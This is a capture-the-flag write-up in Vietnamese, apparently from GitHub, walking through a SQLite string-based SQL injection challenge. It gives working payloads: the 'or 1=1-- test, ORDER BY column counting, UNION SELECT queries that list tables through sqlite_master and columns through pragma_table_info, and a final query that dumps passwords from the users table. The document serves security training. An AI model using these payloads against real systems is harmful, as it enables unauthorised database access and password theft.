# Challenge: SQL Injection - String

<img width="1511" height="508" alt="image" src="https://github.com/user-attachments/assets/8c057093-96e7-4291-8098-9318602951c9" />


Vào Challenge thì cho chúng ta một giao diện như thế này

<img width="1894" height="253" alt="image" src="https://github.com/user-attachments/assets/a9f039ab-b1b5-4d74-a0cb-f5ea121a708d" />


Đầu tiên mình bấm thử vào mấy cái đường link xanh xanh kia , ở trên thanh URL có tham số id nhận giá trị nhập vào thực hiện truy vấn và in ra màn hình kết quả trả về tư truy vấn 

<img width="885" height="331" alt="image" src="https://github.com/user-attachments/assets/7f7cb28d-ae47-46a0-b9ce-377c4cfd7f5e" />


Mình thử fuzz với một vài payload quen thuộc nhưng không nhận lại được gì cả

Tiếp theo ở mấy Tab nhỏ cạnh bên phải , mình thử vào đại tab search , và thử nhập vào `'or 1=1--` thì trang web có trả về thông tin trên màn hình , vậy tức là SQL Injection có hoạt động

<img width="1106" height="350" alt="image" src="https://github.com/user-attachments/assets/bf166cfe-9f1f-4b45-bb87-c7a6a09fac32" />


Đầu tiên xác định số cột 

Truyền vào
```sql
' order by 2--
```

<img width="1073" height="264" alt="image" src="https://github.com/user-attachments/assets/23e31c2b-cceb-4e72-883a-2049c79d4e9f" />

Chúng ta xác định được số cột bằng 2 

Xác định tên bảng , chúng ta thử fuzz bằng một vài lệnh liên quan đến liệt kê danh sách bảng với những hệ quản trị cơ sở dữ liệu khác nhau 
```sql
' union SELECT name,null FROM sqlite_master WHERE type='table'---
```

<img width="1095" height="402" alt="table string" src="https://github.com/user-attachments/assets/d45f0b84-e5a8-449b-9670-442c9e4203bb" />

Thấy được bảng users có liên quan , tiếp tục xác định tên cột
```sql
' union SELECT name,null FROM pragma_table_info('users')--
```
  <img width="1110" height="445" alt="column string" src="https://github.com/user-attachments/assets/a3dc1490-05fa-44fa-90fc-bf247bb7bcc4" />

Xác định được thêm 2 cột liên quan là username và password. Cuối cùng là payload lấy password là xong thôi

```sql
union select password,null from users ---
```

<img width="1115" height="471" alt="password string" src="https://github.com/user-attachments/assets/195a2a6d-f12c-420a-ad37-ca9d3d83c3ef" />

Done Challenge này !!!
